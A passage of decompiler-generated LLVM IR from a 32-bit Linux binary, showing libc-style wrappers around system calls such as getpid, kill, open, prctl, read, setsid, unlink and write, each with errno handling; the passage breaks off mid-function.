  %v0_8050287 = load i32, i32* @ebx, align 4
  store i32 %v0_8050287, i32* %stack_var_-4, align 4
  %v1_8050290 = call i32 @getpid(i32 %v0_8050287)
  store i32 %v1_8050290, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8050290, -4095
  br i1 %tmp7, label %dec_label_pc_80502a7, label %dec_label_pc_805029b

dec_label_pc_805029b:                             ; preds = %dec_label_pc_8050287
  %v1_805029b = call i32 @function_805076b(i32 %v0_8050287)
  %v0_80502a0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80502a0 = sub i32 0, %v0_80502a0
  %v2_80502a2 = inttoptr i32 %v1_805029b to i32*
  store i32 %v1_80502a0, i32* %v2_80502a2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80502ab.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80502a7

dec_label_pc_80502a7:                             ; preds = %dec_label_pc_8050287, %dec_label_pc_805029b
  %v2_80502ab = phi i32 [ %v0_8050287, %dec_label_pc_8050287 ], [ %v2_80502ab.pre, %dec_label_pc_805029b ]
  %v0_80502a7 = phi i32 [ %v1_8050290, %dec_label_pc_8050287 ], [ -1, %dec_label_pc_805029b ]
  %v2_80502a9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80502a9, i32* @edx, align 4
  store i32 %v2_80502ab, i32* @ebx, align 4
  ret i32 %v0_80502a7

; uselistorder directives
  uselistorder i32 %v1_8050290, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80502a7, { 1, 0 }
}

define i32 @function_80502ad() local_unnamed_addr {
dec_label_pc_80502ad:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80502ad = load i32, i32* @ebx, align 4
  store i32 %v0_80502ad, i32* %stack_var_-4, align 4
  %v1_80502b6 = call i32 @getppid(i32 %v0_80502ad)
  store i32 %v1_80502b6, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80502b6, -4095
  br i1 %tmp7, label %dec_label_pc_80502cd, label %dec_label_pc_80502c1

dec_label_pc_80502c1:                             ; preds = %dec_label_pc_80502ad
  %v1_80502c1 = call i32 @function_805076b(i32 %v0_80502ad)
  %v0_80502c6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80502c6 = sub i32 0, %v0_80502c6
  %v2_80502c8 = inttoptr i32 %v1_80502c1 to i32*
  store i32 %v1_80502c6, i32* %v2_80502c8, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80502d1.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80502cd

dec_label_pc_80502cd:                             ; preds = %dec_label_pc_80502ad, %dec_label_pc_80502c1
  %v2_80502d1 = phi i32 [ %v0_80502ad, %dec_label_pc_80502ad ], [ %v2_80502d1.pre, %dec_label_pc_80502c1 ]
  %v0_80502cd = phi i32 [ %v1_80502b6, %dec_label_pc_80502ad ], [ -1, %dec_label_pc_80502c1 ]
  store i32 %v2_80502d1, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80502cd

; uselistorder directives
  uselistorder i32 %v1_80502b6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80502cd, { 1, 0 }
}

define i32 @function_80502d3(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80502d3:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80502d3 = load i32, i32* @edi, align 4
  store i32 %v0_80502d3, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80502eb = load i32, i32* @ebx, align 4
  %v2_80502f3 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_80502f3, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v2_80502f3, -4095
  br i1 %tmp12, label %dec_label_pc_805030b, label %dec_label_pc_80502ff

dec_label_pc_80502ff:                             ; preds = %dec_label_pc_80502d3
  %v1_80502ff = call i32 @function_805076b(i32 %v0_80502eb)
  %v0_8050304 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050304 = sub i32 0, %v0_8050304
  %v2_8050306 = inttoptr i32 %v1_80502ff to i32*
  store i32 %v1_8050304, i32* %v2_8050306, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050310.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805030b

dec_label_pc_805030b:                             ; preds = %dec_label_pc_80502d3, %dec_label_pc_80502ff
  %v2_8050310 = phi i32 [ %v0_80502d3, %dec_label_pc_80502d3 ], [ %v2_8050310.pre, %dec_label_pc_80502ff ]
  %v0_805030b = phi i32 [ %v2_80502f3, %dec_label_pc_80502d3 ], [ -1, %dec_label_pc_80502ff ]
  store i32 %v2_8050310, i32* %edi.global-to-local, align 4
  ret i32 %v0_805030b

; uselistorder directives
  uselistorder i32 %v2_80502f3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805030b, { 1, 0 }
}

define i32 @function_8050312(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050312:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050312 = load i32, i32* @ebx, align 4
  store i32 %v0_8050312, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050325 = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_8050325, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8050325, -4095
  br i1 %tmp9, label %dec_label_pc_805033e, label %dec_label_pc_8050332

dec_label_pc_8050332:                             ; preds = %dec_label_pc_8050312
  %v1_8050332 = call i32 @function_805076b(i32 %v0_8050312)
  %v0_8050337 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050337 = sub i32 0, %v0_8050337
  %v2_8050339 = inttoptr i32 %v1_8050332 to i32*
  store i32 %v1_8050337, i32* %v2_8050339, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8050342.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805033e

dec_label_pc_805033e:                             ; preds = %dec_label_pc_8050312, %dec_label_pc_8050332
  %v2_8050342 = phi i32 [ %v0_8050312, %dec_label_pc_8050312 ], [ %v2_8050342.pre, %dec_label_pc_8050332 ]
  %v0_805033e = phi i32 [ %v2_8050325, %dec_label_pc_8050312 ], [ -1, %dec_label_pc_8050332 ]
  %v2_8050340 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050340, i32* @edx, align 4
  store i32 %v2_8050342, i32* @ebx, align 4
  ret i32 %v0_805033e

; uselistorder directives
  uselistorder i32 %v2_8050325, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805033e, { 1, 0 }
}

define i32 @function_8050344(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050344:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8050345 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_805034b = sdiv i32 %sext, 16777216
  %v4_805034f = ptrtoint i8* %arg1 to i32
  %v3_8050353 = and i32 %arg2, 64
  %v4_8050353 = icmp eq i32 %v3_8050353, 0
  br i1 %v4_8050353, label %dec_label_pc_8050364, label %dec_label_pc_8050358

dec_label_pc_8050358:                             ; preds = %dec_label_pc_8050344
  br label %dec_label_pc_8050364

dec_label_pc_8050364:                             ; preds = %dec_label_pc_8050344, %dec_label_pc_8050358
  store i32 %v4_805034f, i32* %ebx.global-to-local, align 4
  %v5_805036f = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_805034b)
  store i32 %v5_805036f, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_805036f, -4095
  br i1 %tmp15, label %dec_label_pc_8050387, label %dec_label_pc_805037b

dec_label_pc_805037b:                             ; preds = %dec_label_pc_8050364
  %v1_805037b = call i32 @function_805076b(i32 %v0_8050345)
  %v0_8050380 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050380 = sub i32 0, %v0_8050380
  %v2_8050382 = inttoptr i32 %v1_805037b to i32*
  store i32 %v1_8050380, i32* %v2_8050382, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050387

dec_label_pc_8050387:                             ; preds = %dec_label_pc_8050364, %dec_label_pc_805037b
  %v0_8050387 = phi i32 [ %v5_805036f, %dec_label_pc_8050364 ], [ -1, %dec_label_pc_805037b ]
  store i32 %v0_8050345, i32* @ebx, align 4
  ret i32 %v0_8050387

; uselistorder directives
  uselistorder i32 %v5_805036f, { 1, 0, 2 }
  uselistorder i32 %v0_8050345, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050387, { 1, 0 }
  uselistorder label %dec_label_pc_8050364, { 1, 0 }
}

define i32 @function_805038f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805038f:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050390 = load i32, i32* @esi, align 4
  store i32 %v0_8050390, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80503a8 = load i32, i32* @ebx, align 4
  %v5_80503b0 = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5)
  store i32 %v5_80503b0, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v5_80503b0, -4095
  br i1 %tmp12, label %dec_label_pc_80503c8, label %dec_label_pc_80503bc

dec_label_pc_80503bc:                             ; preds = %dec_label_pc_805038f
  %v1_80503bc = call i32 @function_805076b(i32 %v0_80503a8)
  %v0_80503c1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80503c1 = sub i32 0, %v0_80503c1
  %v2_80503c3 = inttoptr i32 %v1_80503bc to i32*
  store i32 %v1_80503c1, i32* %v2_80503c3, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_80503cb.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80503c8

dec_label_pc_80503c8:                             ; preds = %dec_label_pc_805038f, %dec_label_pc_80503bc
  %v2_80503cb = phi i32 [ %v0_8050390, %dec_label_pc_805038f ], [ %v2_80503cb.pre, %dec_label_pc_80503bc ]
  %v0_80503c8 = phi i32 [ %v5_80503b0, %dec_label_pc_805038f ], [ -1, %dec_label_pc_80503bc ]
  store i32 %v2_80503cb, i32* %esi.global-to-local, align 4
  ret i32 %v0_80503c8

; uselistorder directives
  uselistorder i32 %v5_80503b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80503c8, { 1, 0 }
}

define i32 @function_80503ce(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80503ce:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80503ce = load i32, i32* @edi, align 4
  store i32 %v0_80503ce, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80503de = load i32, i32* @ebx, align 4
  %v4_80503e6 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_80503e6, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_80503e6, -4095
  br i1 %tmp12, label %dec_label_pc_80503fe, label %dec_label_pc_80503f2

dec_label_pc_80503f2:                             ; preds = %dec_label_pc_80503ce
  %v1_80503f2 = call i32 @function_805076b(i32 %v0_80503de)
  %v0_80503f7 = load i32, i32* %edi.global-to-local, align 4
  %v1_80503f7 = sub i32 0, %v0_80503f7
  %v2_80503f9 = inttoptr i32 %v1_80503f2 to i32*
  store i32 %v1_80503f7, i32* %v2_80503f9, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050402.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80503fe

dec_label_pc_80503fe:                             ; preds = %dec_label_pc_80503ce, %dec_label_pc_80503f2
  %v2_8050402 = phi i32 [ %v0_80503ce, %dec_label_pc_80503ce ], [ %v2_8050402.pre, %dec_label_pc_80503f2 ]
  %v0_80503fe = phi i32 [ %v4_80503e6, %dec_label_pc_80503ce ], [ -1, %dec_label_pc_80503f2 ]
  store i32 %v2_8050402, i32* %edi.global-to-local, align 4
  ret i32 %v0_80503fe

; uselistorder directives
  uselistorder i32 %v4_80503e6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80503fe, { 1, 0 }
}

define i32 @function_8050404(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050404:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = inttoptr i32 %arg2 to i8*
  %stack_var_-4 = alloca i32, align 4
  %v0_8050404 = load i32, i32* @edi, align 4
  store i32 %v0_8050404, i32* %stack_var_-4, align 4
  %v4_8050408 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050408, i32* %edi.global-to-local, align 4
  %v0_8050414 = load i32, i32* @ebx, align 4
  %v7_805041c = call i32 @readlink(i8* %arg1, i8* %tmp6, i32 %arg3)
  store i32 %v7_805041c, i32* %edi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_805041c, -4095
  br i1 %tmp14, label %dec_label_pc_8050434, label %dec_label_pc_8050428

dec_label_pc_8050428:                             ; preds = %dec_label_pc_8050404
  %v1_8050428 = call i32 @function_805076b(i32 %v0_8050414)
  %v0_805042d = load i32, i32* %edi.global-to-local, align 4
  %v1_805042d = sub i32 0, %v0_805042d
  %v2_805042f = inttoptr i32 %v1_8050428 to i32*
  store i32 %v1_805042d, i32* %v2_805042f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050438.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050434

dec_label_pc_8050434:                             ; preds = %dec_label_pc_8050404, %dec_label_pc_8050428
  %v2_8050438 = phi i32 [ %v0_8050404, %dec_label_pc_8050404 ], [ %v2_8050438.pre, %dec_label_pc_8050428 ]
  %v0_8050434 = phi i32 [ %v7_805041c, %dec_label_pc_8050404 ], [ -1, %dec_label_pc_8050428 ]
  store i32 %v2_8050438, i32* %edi.global-to-local, align 4
  ret i32 %v0_8050434

; uselistorder directives
  uselistorder i32 %v7_805041c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050434, { 1, 0 }
}

define i32 @function_805043a() local_unnamed_addr {
dec_label_pc_805043a:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805043b = load i32, i32* @esi, align 4
  store i32 %v0_805043b, i32* %stack_var_-8, align 4
  %v0_8050453 = load i32, i32* @ebx, align 4
  %v1_805045b = call i32 @int80_syscall(i32 142)
  store i32 %v0_8050453, i32* @ebx, align 4
  store i32 %v1_805045b, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_805045b, -4095
  br i1 %tmp12, label %dec_label_pc_8050473, label %dec_label_pc_8050467

dec_label_pc_8050467:                             ; preds = %dec_label_pc_805043a
  %v1_8050467 = call i32 @function_805076b(i32 %v0_8050453)
  %v0_805046c = load i32, i32* %esi.global-to-local, align 4
  %v1_805046c = sub i32 0, %v0_805046c
  %v2_805046e = inttoptr i32 %v1_8050467 to i32*
  store i32 %v1_805046c, i32* %v2_805046e, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8050476.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8050473

dec_label_pc_8050473:                             ; preds = %dec_label_pc_805043a, %dec_label_pc_8050467
  %v2_8050476 = phi i32 [ %v0_805043b, %dec_label_pc_805043a ], [ %v2_8050476.pre, %dec_label_pc_8050467 ]
  %v0_8050473 = phi i32 [ %v1_805045b, %dec_label_pc_805043a ], [ -1, %dec_label_pc_8050467 ]
  store i32 %v2_8050476, i32* @esi, align 4
  ret i32 %v0_8050473

; uselistorder directives
  uselistorder i32 %v1_805045b, { 1, 0, 2 }
  uselistorder i32 %v0_8050453, { 1, 0 }
  uselistorder label %dec_label_pc_8050473, { 1, 0 }
}

define i32 @function_8050479() local_unnamed_addr {
dec_label_pc_8050479:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050479 = load i32, i32* @ebx, align 4
  store i32 %v0_8050479, i32* %stack_var_-4, align 4
  %v1_8050482 = call i32 @setsid(i32 %v0_8050479)
  store i32 %v1_8050482, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8050482, -4095
  br i1 %tmp7, label %dec_label_pc_8050499, label %dec_label_pc_805048d

dec_label_pc_805048d:                             ; preds = %dec_label_pc_8050479
  %v1_805048d = call i32 @function_805076b(i32 %v0_8050479)
  %v0_8050492 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050492 = sub i32 0, %v0_8050492
  %v2_8050494 = inttoptr i32 %v1_805048d to i32*
  store i32 %v1_8050492, i32* %v2_8050494, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805049d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050499

dec_label_pc_8050499:                             ; preds = %dec_label_pc_8050479, %dec_label_pc_805048d
  %v2_805049d = phi i32 [ %v0_8050479, %dec_label_pc_8050479 ], [ %v2_805049d.pre, %dec_label_pc_805048d ]
  %v0_8050499 = phi i32 [ %v1_8050482, %dec_label_pc_8050479 ], [ -1, %dec_label_pc_805048d ]
  store i32 %v2_805049d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8050499

; uselistorder directives
  uselistorder i32 %v1_8050482, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050499, { 1, 0 }
}

define i32 @function_805049f(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805049f:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80504a0 = load i32, i32* @esi, align 4
  %v4_80504a4 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_80504a4, i32* @ecx, align 4
  %v2_80504b0 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  %tmp11 = icmp ult i32 %arg1, 3
  %or.cond = or i1 %tmp11, %v2_80504b0
  br i1 %or.cond, label %dec_label_pc_80504c9, label %dec_label_pc_80504b9

dec_label_pc_80504b9:                             ; preds = %dec_label_pc_805049f
  %v1_80504b9 = call i32 @function_805076b(i32 %v0_80504a0)
  %v1_80504be = inttoptr i32 %v1_80504b9 to i32*
  store i32 22, i32* %v1_80504be, align 4
  br label %dec_label_pc_80504f0

dec_label_pc_80504c9:                             ; preds = %dec_label_pc_805049f
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_80504ce = load i32, i32* @ebx, align 4
  %v7_80504d6 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_80504ce, i32* @ebx, align 4
  store i32 %v7_80504d6, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_80504d6, -4095
  br i1 %tmp12, label %dec_label_pc_80504f0, label %dec_label_pc_80504e2

dec_label_pc_80504e2:                             ; preds = %dec_label_pc_80504c9
  %v1_80504e2 = call i32 @function_805076b(i32 %v0_80504ce)
  %v0_80504e7 = load i32, i32* %esi.global-to-local, align 4
  %v1_80504e7 = sub i32 0, %v0_80504e7
  %v2_80504e9 = inttoptr i32 %v1_80504e2 to i32*
  store i32 %v1_80504e7, i32* %v2_80504e9, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80504f0

dec_label_pc_80504f0:                             ; preds = %dec_label_pc_80504e2, %dec_label_pc_80504c9, %dec_label_pc_80504b9
  %storemerge = phi i32 [ -1, %dec_label_pc_80504b9 ], [ %v7_80504d6, %dec_label_pc_80504c9 ], [ -1, %dec_label_pc_80504e2 ]
  %v2_80504f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80504f0, i32* @edx, align 4
  store i32 %v0_80504a0, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_80504d6, { 1, 0, 2 }
  uselistorder i32 %v0_80504ce, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_80504f4() local_unnamed_addr {
dec_label_pc_80504f4:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80504f4 = load i32, i32* @edi, align 4
  store i32 %v0_80504f4, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_80504fc = load i32, i32* @ebx, align 4
  %v1_8050504 = inttoptr i32 %tmp to i32*
  %v2_8050504 = call i32 @time(i32* %v1_8050504)
  store i32 %v0_80504fc, i32* @ebx, align 4
  store i32 %v2_8050504, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8050504, -4095
  br i1 %tmp9, label %dec_label_pc_805051c, label %dec_label_pc_8050510

dec_label_pc_8050510:                             ; preds = %dec_label_pc_80504f4
  %v1_8050510 = call i32 @function_805076b(i32 %v0_80504fc)
  %v0_8050515 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050515 = sub i32 0, %v0_8050515
  %v2_8050517 = inttoptr i32 %v1_8050510 to i32*
  store i32 %v1_8050515, i32* %v2_8050517, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050520.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805051c

dec_label_pc_805051c:                             ; preds = %dec_label_pc_80504f4, %dec_label_pc_8050510
  %v2_8050520 = phi i32 [ %v0_80504f4, %dec_label_pc_80504f4 ], [ %v2_8050520.pre, %dec_label_pc_8050510 ]
  %v0_805051c = phi i32 [ %v2_8050504, %dec_label_pc_80504f4 ], [ -1, %dec_label_pc_8050510 ]
  store i32 %v2_8050520, i32* %edi.global-to-local, align 4
  ret i32 %v0_805051c

; uselistorder directives
  uselistorder i32 %v2_8050504, { 1, 0, 2 }
  uselistorder i32 %v0_80504fc, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_805051c, { 1, 0 }
}

define i32 @function_8050522(i8* %arg1) local_unnamed_addr {
dec_label_pc_8050522:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050522 = load i32, i32* @edi, align 4
  store i32 %v0_8050522, i32* %stack_var_-4, align 4
  %v4_8050526 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050526, i32* %edi.global-to-local, align 4
  %v0_805052a = load i32, i32* @ebx, align 4
  %v3_8050532 = call i32 @unlink(i8* %arg1)
  store i32 %v3_8050532, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8050532, -4095
  br i1 %tmp9, label %dec_label_pc_805054a, label %dec_label_pc_805053e

dec_label_pc_805053e:                             ; preds = %dec_label_pc_8050522
  %v1_805053e = call i32 @function_805076b(i32 %v0_805052a)
  %v0_8050543 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050543 = sub i32 0, %v0_8050543
  %v2_8050545 = inttoptr i32 %v1_805053e to i32*
  store i32 %v1_8050543, i32* %v2_8050545, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805054e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805054a

dec_label_pc_805054a:                             ; preds = %dec_label_pc_8050522, %dec_label_pc_805053e
  %v2_805054e = phi i32 [ %v0_8050522, %dec_label_pc_8050522 ], [ %v2_805054e.pre, %dec_label_pc_805053e ]
  %v0_805054a = phi i32 [ %v3_8050532, %dec_label_pc_8050522 ], [ -1, %dec_label_pc_805053e ]
  store i32 %v2_805054e, i32* %edi.global-to-local, align 4
  ret i32 %v0_805054a

; uselistorder directives
  uselistorder i32 %v3_8050532, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805054a, { 1, 0 }
}

define i32 @function_8050550(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050550:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050550 = load i32, i32* @edi, align 4
  store i32 %v0_8050550, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050560 = load i32, i32* @ebx, align 4
  %v4_8050568 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8050568, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8050568, -4095
  br i1 %tmp12, label %dec_label_pc_8050580, label %dec_label_pc_8050574

dec_label_pc_8050574:                             ; preds = %dec_label_pc_8050550
  %v1_8050574 = call i32 @function_805076b(i32 %v0_8050560)
  %v0_8050579 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050579 = sub i32 0, %v0_8050579
  %v2_805057b = inttoptr i32 %v1_8050574 to i32*
  store i32 %v1_8050579, i32* %v2_805057b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8050584.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050580

dec_label_pc_8050580:                             ; preds = %dec_label_pc_8050550, %dec_label_pc_8050574
  %v2_8050584 = phi i32 [ %v0_8050550, %dec_label_pc_8050550 ], [ %v2_8050584.pre, %dec_label_pc_8050574 ]
  %v0_8050580 = phi i32 [ %v4_8050568, %dec_label_pc_8050550 ], [ -1, %dec_label_pc_8050574 ]
  store i32 %v2_8050584, i32* %edi.global-to-local, align 4
  ret i32 %v0_8050580

; uselistorder directives
  uselistorder i32 %v4_8050568, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050580, { 1, 0 }
}

define i32 @function_8050586(i32* %arg1) local_unnamed_addr {
dec_label_pc_8050586:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_8050588 = load i32, i32* @ebx, align 4
  %v12_8050589 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp3, i32* @edi, align 4
  %v2_8050590 = load i32, i32* %arg1, align 4
  %v12_8050590 = icmp eq i32 %v2_8050590, -1
  %v1_8050593 = icmp eq i1 %v12_8050590, false
  br i1 %v1_8050593, label %dec_label_pc_80505a5, label %dec_label_pc_8050595

dec_label_pc_8050595:                             ; preds = %dec_label_pc_8050586
  %v1_8050595 = call i32 @function_805076b(i32 %v0_8050588)
  %v1_805059a = inttoptr i32 %v1_8050595 to i32*
  store i32 9, i32* %v1_805059a, align 4
  br label %dec_label_pc_80505ef

dec_label_pc_80505a5:                             ; preds = %dec_label_pc_8050586
  %v1_80505a5 = add i32 %tmp3, 24
  store i32 %v12_8050589, i32* @esi, align 4
  %v2_80505b4 = call i32 @function_80520ca(i32 %v12_8050589, i32 134553799)
  %v1_80505bc = call i32 @function_80520c7(i32 %v1_80505a5)
  store i32 %v1_80505bc, i32* @eax, align 4
  %v0_80505c1 = load i32, i32* @edi, align 4
  %v1_80505c1 = inttoptr i32 %v0_80505c1 to i32*
  %v2_80505c1 = load i32, i32* %v1_80505c1, align 4
  store i32 %v2_80505c1, i32* @ebx, align 4
  store i32 -1, i32* %v1_80505c1, align 4
  %v2_80505ce = call i32 @function_80520ca(i32 %v12_8050589, i32 1)
  %v0_80505d4 = load i32, i32* @edi, align 4
  %v1_80505d4 = add i32 %v0_80505d4, 12
  %v2_80505d4 = inttoptr i32 %v1_80505d4 to i32*
  %v3_80505d4 = load i32, i32* %v2_80505d4, align 4
  %v1_80505d7 = call i32 @function_8051963(i32 %v3_80505d4)
  %v0_80505dc = load i32, i32* @edi, align 4
  %v1_80505df = call i32 @function_8051963(i32 %v0_80505dc)
  %v0_80505e4 = load i32, i32* @ebx, align 4
  %v1_80505e7 = call i32 @function_8050233(i32 %v0_80505e4)
  br label %dec_label_pc_80505ef

dec_label_pc_80505ef:                             ; preds = %dec_label_pc_8050595, %dec_label_pc_80505a5
  %v0_80505f5 = phi i32 [ -1, %dec_label_pc_8050595 ], [ %v1_80505e7, %dec_label_pc_80505a5 ]
  ret i32 %v0_80505f5

; uselistorder directives
  uselistorder label %dec_label_pc_80505ef, { 1, 0 }
}

define i32 @function_80505f6(i32 %arg1) local_unnamed_addr {
dec_label_pc_80505f6:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_8050607 = inttoptr i32 %arg1 to i8*
  %v3_8050607 = call i32 @function_8050344(i8* %v2_8050607, i32 67584)
  store i32 %v3_8050607, i32* %eax.global-to-local, align 4
  store i32 %v3_8050607, i32* @edi, align 4
  %v2_8050611 = icmp slt i32 %v3_8050607, 0
  br i1 %v2_8050611, label %dec_label_pc_80506de, label %dec_label_pc_8050619

dec_label_pc_8050619:                             ; preds = %dec_label_pc_80505f6
  %v0_8050619 = load i32, i32* @ebx, align 4
  %v2_805061b = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_805061b, i32* %eax.global-to-local, align 4
  store i32 %v3_8050607, i32* %stack_var_-124, align 4
  %v4_8050621 = call i32 @function_80524c2(i32 %v3_8050607, i32 %v2_805061b, i32 %v0_8050619, i32 %v0_8050619)
